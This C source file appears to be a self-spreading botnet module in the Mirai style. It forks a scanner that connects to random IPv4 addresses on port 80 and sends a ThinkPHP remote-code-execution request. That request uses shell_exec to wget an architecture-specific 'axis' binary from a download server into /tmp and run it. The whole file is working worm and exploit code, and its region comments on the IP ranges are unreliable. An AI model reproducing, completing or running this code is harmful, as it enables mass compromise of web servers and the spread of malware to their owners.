#include "includes.h"
#include "thinkphp.h"
#include "rand.h"
#include "util.h"

#ifdef SELFREP

#define THINKPHP_SCANNER_MAX_CONNS 128
#define THINKPHP_SCANNER_PORT 80

/* ThinkPHP RCE exploit payload */
static char *thinkphp_payload = 
"GET /index.php?s=/index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=wget%20HTTP_SERVER/bins/axis.%24(uname%20-m)%20-O%20/tmp/t%3Bsh%20/tmp/t HTTP/1.1\r\n"
"Host: %s\r\n"
"Connection: close\r\n\r\n";

struct thinkphp_conn {
    int fd;
    ipv4_t dst_addr;
    time_t last_recv;
};

static struct thinkphp_conn conns[THINKPHP_SCANNER_MAX_CONNS];

static ipv4_t get_random_ip_thinkphp(void);
static void thinkphp_connect(struct thinkphp_conn *);
static void thinkphp_close(struct thinkphp_conn *);

void thinkphp_scanner_init(void) {
    if (fork() == 0) {
        int i;
        
        for (i = 0; i < THINKPHP_SCANNER_MAX_CONNS; i++) {
            conns[i].fd = -1;
        }
        
        while (TRUE) {
            fd_set fdset;
            struct timeval tv;
            int maxfd = 0;
            
            FD_ZERO(&fdset);
            
            for (i = 0; i < THINKPHP_SCANNER_MAX_CONNS; i++) {
                if (conns[i].fd != -1) {
                    FD_SET(conns[i].fd, &fdset);
                    if (conns[i].fd > maxfd) maxfd = conns[i].fd;
                }
            }
            
            tv.tv_sec = 1;
            tv.tv_usec = 0;
            
            select(maxfd + 1, &fdset, NULL, NULL, &tv);
            
            time_t now = time(NULL);
            for (i = 0; i < THINKPHP_SCANNER_MAX_CONNS; i++) {
                if (conns[i].fd != -1 && now - conns[i].last_recv > 10) {
                    thinkphp_close(&conns[i]);
                }
            }
            
            for (i = 0; i < THINKPHP_SCANNER_MAX_CONNS; i++) {
                if (conns[i].fd != -1 && FD_ISSET(conns[i].fd, &fdset)) {
                    char buf[4096];
                    int n = recv(conns[i].fd, buf, sizeof(buf), 0);
                    if (n <= 0) {
                        thinkphp_close(&conns[i]);
                    } else {
                        conns[i].last_recv = now;
                        thinkphp_close(&conns[i]);
                    }
                }
            }
            
            for (i = 0; i < THINKPHP_SCANNER_MAX_CONNS; i++) {
                if (conns[i].fd == -1) {
                    conns[i].dst_addr = get_random_ip_thinkphp();
                    thinkphp_connect(&conns[i]);
                    break;
                }
            }
            
            sleep(1);
        }
    }
}

static ipv4_t get_random_ip_thinkphp(void) {
    ipv4_t addr;

    while (TRUE) {
        addr = rand_next();

        /* Target Asia-Pacific, Europe, Americas - ThinkPHP regions */
        uint8_t first_octet = (addr >> 24) & 0xFF;

        /* Comprehensive global ranges (descending order) */
        if (first_octet == 223 || first_octet == 222 || first_octet == 221 ||  /* Asia */
            first_octet == 220 || first_octet == 219 || first_octet == 218 ||  /* US/Europe/Asia */
            first_octet == 217 || first_octet == 216 || first_octet == 215 ||  /* Europe/US */
            first_octet == 214 || first_octet == 213 || first_octet == 212 ||  /* Asia/Europe */
            first_octet == 211 || first_octet == 210 || first_octet == 209 ||  /* US */
            first_octet == 208 || first_octet == 207 || first_octet == 206 ||  /* US */
            first_octet == 205 || first_octet == 204 || first_octet == 203 ||  /* LatAm/Asia */
            first_octet == 202 || first_octet == 201 || first_octet == 200 ||  /* US/LatAm */
            first_octet == 199 || first_octet == 198 || first_octet == 197 ||  /* Europe/Africa */
            first_octet == 196 || first_octet == 195 || first_octet == 194 ||  /* Europe/Africa */
            first_octet == 193 || first_octet == 192 || first_octet == 191 ||  /* LatAm */
            first_octet == 190 || first_octet == 189 || first_octet == 188 ||  /* LatAm/Asia */
            first_octet == 187 || first_octet == 186 || first_octet == 185 ||  /* Asia */
            first_octet == 184 || first_octet == 183 || first_octet == 182 ||  /* Asia/Middle East */
            first_octet == 181 || first_octet == 180 || first_octet == 179 ||  /* LatAm/Asia */
            first_octet == 178 || first_octet == 177 || first_octet == 176 ||  /* Asia/LatAm */
            first_octet == 175 || first_octet == 174 || first_octet == 173 ||  /* Asia/US */
            first_octet == 172 || first_octet == 171 || first_octet == 170 ||  /* Asia/Africa */
            first_octet == 169 || first_octet == 168 || first_octet == 167 ||  /* Asia/Africa */
            first_octet == 166 || first_octet == 165 || first_octet == 164 ||  /* Asia/Africa */
            first_octet == 163 || first_octet == 162 || first_octet == 161 ||  /* Asia/Africa */
            first_octet == 160 || first_octet == 159 || first_octet == 158 ||  /* Asia/Africa */
            first_octet == 157 || first_octet == 156 || first_octet == 155 ||  /* Asia/Africa */
            first_octet == 154 || first_octet == 153 || first_octet == 152 ||  /* US */
            first_octet == 151 || first_octet == 150 || first_octet == 149 ||  /* US */
            first_octet == 148 || first_octet == 147 || first_octet == 146 ||  /* US */
            first_octet == 145 || first_octet == 144 || first_octet == 143 ||  /* US */
            first_octet == 142 || first_octet == 141 || first_octet == 140 ||  /* US */
            first_octet == 139 || first_octet == 138 || first_octet == 137 ||  /* US */
            first_octet == 136 || first_octet == 135 || first_octet == 134 ||  /* US */
            first_octet == 133 || first_octet == 132 || first_octet == 131 ||  /* US */
            first_octet == 130 || first_octet == 129 || first_octet == 128 ||  /* Asia/US */
            first_octet == 126 || first_octet == 125 || first_octet == 124 ||  /* Asia */
            first_octet == 123 || first_octet == 122 || first_octet == 121 ||  /* Asia */
            first_octet == 120 || first_octet == 119 || first_octet == 118 ||  /* Asia */
            first_octet == 117 || first_octet == 116 || first_octet == 115 ||  /* Asia */
            first_octet == 114 || first_octet == 113 || first_octet == 112 ||  /* Asia */
            first_octet == 111 || first_octet == 110 || first_octet == 109 ||  /* Asia/Europe */
            first_octet == 108 || first_octet == 107 || first_octet == 106 ||  /* Asia/Africa */
            first_octet == 105 || first_octet == 104 || first_octet == 103 ||  /* Asia/Africa */
            first_octet == 102 || first_octet == 101 || first_octet == 100 ||  /* US */
            first_octet == 99 || first_octet == 98 || first_octet == 97 ||     /* Europe/US */
            first_octet == 96 || first_octet == 95 || first_octet == 94 ||     /* Europe */
            first_octet == 93 || first_octet == 92 || first_octet == 91 ||     /* Europe */
            first_octet == 90 || first_octet == 89 || first_octet == 88 ||     /* Europe */
            first_octet == 87 || first_octet == 86 || first_octet == 85 ||     /* Europe */
            first_octet == 84 || first_octet == 83 || first_octet == 82 ||     /* Europe/Asia */
            first_octet == 81 || first_octet == 80 || first_octet == 79 ||     /* Europe */
            first_octet == 78 || first_octet == 77 || first_octet == 76 ||     /* US/Europe */
            first_octet == 75 || first_octet == 74 || first_octet == 73 ||     /* US */
            first_octet == 72 || first_octet == 71 || first_octet == 70 ||     /* US */
            first_octet == 69 || first_octet == 68 || first_octet == 67 ||     /* US */
            first_octet == 66 || first_octet == 65 || first_octet == 64 ||     /* Europe/US */
            first_octet == 63 || first_octet == 62 || first_octet == 61 ||     /* Asia */
            first_octet == 60 || first_octet == 59 || first_octet == 58 ||     /* Europe/Asia */
            first_octet == 57 || first_octet == 56 || first_octet == 55 ||     /* Europe */
            first_octet == 54 || first_octet == 53 || first_octet == 52 ||     /* Europe */
            first_octet == 51 || first_octet == 50 || first_octet == 49 ||     /* Middle East/Europe */
            first_octet == 48 || first_octet == 47 || first_octet == 46 ||     /* Asia/Middle East */
            first_octet == 45 || first_octet == 44 || first_octet == 43 ||     /* Africa/Asia */
            first_octet == 42 || first_octet == 41 || first_octet == 40 ||     /* Asia/Africa */
            first_octet == 39 || first_octet == 38 || first_octet == 37 ||     /* Asia/Europe */
            first_octet == 36 || first_octet == 27 || first_octet == 14 ||     /* Asia-Pacific */
            first_octet == 2 || first_octet == 1) { /* Asia-Pacific */
            break;
        }
    }

    return addr;
}

static void thinkphp_connect(struct thinkphp_conn *conn) {
    struct sockaddr_in addr;
    
    conn->fd = socket(AF_INET, SOCK_STREAM, 0);
    if (conn->fd == -1) return;
    
    fcntl(conn->fd, F_SETFL, O_NONBLOCK | fcntl(conn->fd, F_GETFL, 0));
    
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = conn->dst_addr;
    addr.sin_port = htons(THINKPHP_SCANNER_PORT);
    
    if (connect(conn->fd, (struct sockaddr *)&addr, sizeof(addr)) == 0 || errno == EINPROGRESS) {
        char host[32];
        snprintf(host, sizeof(host), "%d.%d.%d.%d",
            (conn->dst_addr >> 24) & 0xFF,
            (conn->dst_addr >> 16) & 0xFF,
            (conn->dst_addr >> 8) & 0xFF,
            conn->dst_addr & 0xFF);
        
        char payload[1024];
        snprintf(payload, sizeof(payload), thinkphp_payload, host);
        
        send(conn->fd, payload, util_strlen(payload), 0);
        conn->last_recv = time(NULL);
    } else {
        close(conn->fd);
        conn->fd = -1;
    }
}

static void thinkphp_close(struct thinkphp_conn *conn) {
    if (conn->fd != -1) {
        close(conn->fd);
        conn->fd = -1;
    }
}

#endif
